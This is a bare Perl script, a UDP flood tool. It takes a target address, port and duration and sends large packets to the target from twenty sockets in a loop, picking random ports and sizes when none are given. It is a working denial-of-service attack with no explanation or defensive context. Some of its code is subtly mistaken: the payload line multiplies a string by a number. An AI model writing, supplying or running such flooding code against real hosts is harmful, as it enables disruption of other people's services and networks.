#!/usr/bin/perl 
use Socket; 
use strict;

my ($ip, $port, $time, $config) = @ARGV; 
my ($size, $psize, $iaddr, $endtime, $pport);

$size = 3007; $psize = 3007; $iaddr = inet_aton($ip) or die "Cannot resolve hostname $ip"; 
$endtime = time() + ($time ? $time : 1000000);

my $forks = 20; 
my @sockets;

for (1 .. $forks) { my $flood; socket($flood, PF_INET, SOCK_DGRAM, getprotobyname('udp')) or die "socket: $!"; push @sockets, $flood; }

my $custom_payload = "A" * 5000;

while (time() <= $endtime) { foreach my $flood (@sockets) { $psize = $size ? $size : int(rand(3007-64)+64); $pport = $port ? $port : int(rand(65535)+1);

 
    my $dest_addr = sockaddr_in($pport, $iaddr);
    send($flood, ($custom_payload x $psize), 0, $dest_addr) or warn "Send error: $!";
}

}

foreach my $flood (@sockets) { close($flood); }
